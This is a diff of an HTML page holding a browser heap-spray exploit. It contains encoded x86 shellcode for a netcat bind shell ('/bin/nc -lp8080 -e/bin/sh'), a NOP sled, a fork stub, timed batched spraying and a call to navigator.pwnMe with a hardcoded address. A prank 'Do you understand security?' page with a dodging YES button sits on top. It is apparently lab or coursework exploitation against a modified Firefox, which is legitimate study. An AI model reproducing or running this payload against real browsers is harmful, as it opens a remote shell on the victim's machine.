@@ -1,20 +1,33 @@
 <html>
 <head>
 <script>
-    var shellcode = unescape("%u2aeb%u315e%u88c0%u0746%u4688%u880f%u1946%u7689%u8d1a%u085e%u5e89%u8d1e%u105e%u5e89%u8922%u2646%u0bb0%uf389%u4e8d%u8d1a%u2656%u80cd%ud1e8%uffff%u2fff%u6962%u2f6e%u636e%u2d23%u706c%u3038%u3038%u2d23%u2f65%u6962%u2f6e%u6873%uee23");
-//    var shellcode = unescape("%uc390");
-//    var forkMe = unescape("%u02b8%u0000%ucd00%u8580%u74c0%uc301"); 
-    var forkMe = unescape("%u3190%ub0c0%ucd02%u8580%u74c0%uc301"); 
-    var oneblock = unescape("%u9090%u9090");
-    window.onload = function() {
-    document.getElementById('blockLength').innerHTML = 'One block length: ' + oneblock.length;
-    document.getElementById('shellLength').innerHTML = 'Shellcode length: ' + shellcode.length;
-    document.getElementById('fullLength').innerHTML = 'Fulllength length: ' + fullBlock.length;
-    document.getElementById('spray').innerHTML = 'One spray length: ' +   sprayContainer[0].length;
-    document.getElementById('shellcode').innerHTML = 'Shellcode: ' +   escape(shellcode);
-    document.getElementById('oneblock').innerHTML = 'One block length: ' +   escape(oneblock);
-    }
+    var shellcode = unescape("%u2aeb%u315e" + "%u88c0%u0746" +
+    "%u4688%u880f"+ "%u1946%u7689" +
+    "%u8d1a%u085e"+ "%u5e89%u8d1e" +
+    "%u105e%u5e89"+ "%u8922%u2646" +
+    "%u0bb0%uf389"+ "%u4e8d%u8d1a" +
+    "%u2656%u80cd"+ "%ud1e8%uffff" +
+    "%u2fff%u6962"+ "%u2f6e%u636e" +
+    "%u2d23%u706c"+ "%u3038%u3038" +
+    "%u2d23%u2f65"+ "%u6962%u2f6e" +
+    "%u6873%uee23");
 
+    var forkMe = unescape("%u3190%ub0c0" + 
+    "%ucd02%u8580" + "%u74c0%uc301"); 
+    var vForkMe = unescape("%u3190%ub0c0" +
+    "%ucdbe%u8580" + "%u74c0%uc301"); 
+    var oneblock = unescape("%u9090%u9090");
+/*
+    window.onload = function() {
+      document.getElementById('blockLength').innerHTML = 'One block length: ' + oneblock.length;
+      document.getElementById('shellLength').innerHTML = 'Shellcode length: ' + shellcode.length;
+      document.getElementById('fullLength').innerHTML = 'Fulllength length: ' + fullBlock.length;
+      document.getElementById('spray').innerHTML = 'One spray length: ' +   sprayContainer[0].length;
+      document.getElementById('shellcode').innerHTML = 'Shellcode: ' +   escape(shellcode);
+      document.getElementById('oneblock').innerHTML = 'One block length: ' +   escape(oneblock);
+    }
+*/
+    // Makes NOP sled
     var fullBlock = oneblock;
     while(fullBlock.length < 0x10000) {
       fullBlock+=oneblock;
@@ -31,22 +44,82 @@
 // Multiple refreshes(8) work at 3250. Do we need more? Change this after analysing in different situations.
 
     sprayContainer = new Array();
-    for (i = 0; i < 2050; i++) {
-      sprayContainer[i] = fullBlock + forkMe +shellcode;
+    var noOfSprays = 3000;
+    var alreadySprayed = 0;
+    var delay = 500;
+    var sprayPerIteration = 300;
+
+
+/*
+  Spraying the heap periodically, so that Firefox doesn't hang during the
+  loading of the page.
+*/    
+    function spray() {
+      for (var i = alreadySprayed; i < alreadySprayed + sprayPerIteration; i++) {
+      sprayContainer[i] = fullBlock  + vForkMe+ shellcode;
+      }
+      alreadySprayed = i;
+      if (alreadySprayed >= noOfSprays) {
+        var sales = <sales vendor="John">
+        <item type="peas" price="4" quantity="6"/>
+        <item type="carrot" price="3" quantity="10"/>
+        <item type="chips" price="5" quantity="3"/>
+        </sales>;
+//        alert("Surprise!! ");
+        navigator.pwnMe("0xa2083ff0");
+        setTimeout("cleanUp()", 4*delay);
+      }
+      else {
+        setTimeout("spray()", delay);
+      }
     }
 
+    spray();
 
-    var sales = <sales vendor="John">
-    <item type="peas" price="4" quantity="6"/>
-    <item type="carrot" price="3" quantity="10"/>
-    <item type="chips" price="5" quantity="3"/>
-    </sales>;
+    /*
+    Cleanup the code after we have completely sprayed and executed the
+    //bin/nc -lp8080 -e/bin/sh in a new process.
+    */
+    function cleanUp() {
+//      alert("Cleaning up");
+      sprayContainer = [];
+    }
     
-     navigator.pwnMe("0x9c201000");
+
+</script>
+
+
+<script type="text/javascript">
+flag=1
+function acceptedNo()
+{
+  alert("We are on the same page!!! :p")
+}
+function roamAround()
+{
+	if(flag==1)
+  {
+    Bn.style.top=90
+    Bn.style.left=500
+    flag=2
+  }
+  else if(flag==2)
+  {
+    Bn.style.top=90
+    Bn.style.left=50
+    flag=3
+  }
+  else if(flag==3)
+  {
+    Bn.style.top=235
+    Bn.style.left=360
+    flag=1
+  }
+}
 </script>
 </head> 
 <body>
-        <h1>Fuck you, you noob shit. Hah</h1>
+
 
         <div id="blockLength"></div>
         <div id="shellLength"></div>
@@ -54,5 +127,19 @@
         <div id="spray"></div>
         <div id="shellcode"></div>
         <div id="oneblock"></div>
+
+  <h1
+    style="position:absolute;  color: rgb(8, 120, 141);
+font-family: sans-serif;left:220px; top:175px; width:auto; height:210px;">
+      Do you understand security?</h1>
+<div id="By"
+  style="position:absolute; left:285px; top:235px; width:210px; height:210px;">
+  <input type="button" value=" NO " onclick="acceptedNo()" />
+</div>
+
+<div ID="Bn"
+  style="position:absolute; left:360px; top:235px; width:210px; height:210px;">
+  <input type="button" value="  YES  " onmouseover="roamAround()" />
+</div>
 </body>
 </html>
